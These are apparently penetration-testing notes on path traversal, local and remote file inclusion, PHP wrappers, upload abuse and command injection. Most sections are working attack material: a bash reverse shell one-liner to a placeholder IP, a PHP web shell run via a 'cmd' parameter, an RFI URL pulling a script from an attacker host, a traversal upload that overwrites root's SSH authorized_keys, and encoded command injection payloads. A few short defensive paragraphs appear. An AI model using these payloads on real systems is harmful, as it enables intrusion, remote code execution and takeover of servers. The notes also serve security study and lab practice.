# Directory Traversal
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system). 
# File Inclusion Vulnerabilities

## Local File Inclusion
Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

Exploiting a Path Traversal and a LFI in a server, could led us to open shell using a **simple reverse shell bash oneliner**, if we poison some part of the system, for example the Apache Logs in a Linux system, eg: [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/).

```shell
bash -i >& /dev/tcp/<IP>/4000 0>&1
```

## PHP Wrappers
```php
# php://filter
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

# php://filter/convert.base64-encode
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

```

## Remote File Inclusion
Remote File Inclusion or RFI is done the same way of LFI, but we have to be the source of the malicious script. In the case of a PHP webserver, It could be

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

And we can call the script with an inclusion of it, eg: `http://webserver.com/index.php?page=http://<attacker-ip>/malicious-file.php` . On the attacker side we have first to launch a webserver with the malicious file with

```shell
python3 -m http.server 80
```

# File Upload Vulnerabilities

## Using Executable Files
When an application accepts uploads that are later treated as server-executable (for example `.php`, `.asp`, `.aspx`, `.jsp`), an attacker can upload a web shell and execute arbitrary code through HTTP requests. To discover such an upload point, interact with obvious forms (avatars, CMS media, careers, document uploads) and try uploading a benign file such as `test.txt` to confirm the mechanism. If the application rejects files by extension, simple bypasses often work: change the extension to an alternative supported by the runtime (e.g. `.phps`, `.php7`) or modify the case of the extension (e.g. `simple-backdoor.pHP`) to evade naïve, case-sensitive blacklists. After uploading a web shell into a publicly reachable directory you can invoke it from a browser or with `curl` to run commands; for example:
```bash
# invoke a uploaded PHP webshell to list directory contents 
curl "http://TARGET/uploads/simple-backdoor.pHP?cmd=dir"
```

Defensive controls for executable uploads include enforcing a strict allowlist of MIME types and extensions (checked case-insensitively and canonicalized), storing uploads outside the web root, performing server-side content sniffing (not trusting client-provided MIME type), and preventing any user-controlled filename from becoming executable by the web server.
## Using Non-Executable Files
Even when uploads cannot be executed directly, they can still enable severe attacks when combined with other weaknesses. A common pattern is abusing a file upload together with improper path handling to write files outside the intended storage directory. If the application places uploaded files using a filename parameter that isn’t sanitized, an attacker can include relative-path sequences like `../../..` to target sensitive locations. For example, if you prepare an `authorized_keys` file containing your public SSH key and upload it using a traversal filename, you may be able to overwrite `~/.ssh/authorized_keys` and obtain SSH access:

```bash
# create keypair and prepare authorized_keys locally
ssh-keygen -f myattackkey -N ""
cat myattackkey.pub > authorized_keys

# upload using the app's form but set filename to a traversal path:
# ../../../../root/.ssh/authorized_keys
# (exact number of ../ depends on server layout)
```

If successful, connect with your private key and the appropriate port:
```bash
# connect to a non-standard SSH port with the private key 
ssh -i myattackkey -p 2222 root@TARGET
```
Other non-executable attack vectors include uploading crafted XML/SVG files that trigger XXE or embedding scriptable content in allowed image formats (e.g., SVG with inline scripts), and abusing application features that permit users to rename or move files after upload so an innocuous file becomes sensitive. When testing such techniques, be mindful that overwriting files on production systems can cause data loss or downtime.

Defensive measures against non-executable abuse include canonicalizing and sanitizing all filenames, rejecting any `..` sequences or absolute paths, forcing uploads into a server-controlled directory (no user-controlled destination), applying strict file permissions, performing content validation and scanning, and isolating uploads from sensitive system paths.

# Command Injection
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

This attack differs from Code Injection, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. For example if a web server executes a command on the operating system below and doesn't sanitize the input, could let the attacker craft a payload with some special characters like `;` or `&&` that are used to concatenate commands in a system. A practical example could be a server that arguments for a known command, eg: ls

```shell
http://<target-url>/pages/command=cmd=ls;id
```

In that case the webserver executes `ls` among with the `id` command.
```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```